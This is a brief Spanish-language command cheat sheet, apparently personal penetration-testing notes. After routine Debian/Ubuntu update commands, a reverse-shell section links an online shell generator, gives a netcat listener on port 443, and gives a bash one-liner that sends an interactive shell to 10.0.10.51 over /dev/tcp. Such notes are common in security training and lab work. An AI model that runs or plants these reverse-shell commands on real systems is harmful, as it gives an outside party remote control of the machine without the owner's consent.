---
## Comandos útiles
---


## Actualización del sistema (Debian/Ubuntu)

```bash
apt update
apt upgrade -y
apt autoremove
apt dist-upgrade
reboot
```

---

## Reverse Shells

- Generador online: [https://www.revshells.com/](https://www.revshells.com/)

### Escuchar conexiones entrantes con Netcat

```bash
nc -nlvp 443
```

### Reverse shell básica en bash

```bash
sh -i >& /dev/tcp/10.0.10.51/443 0>&1
```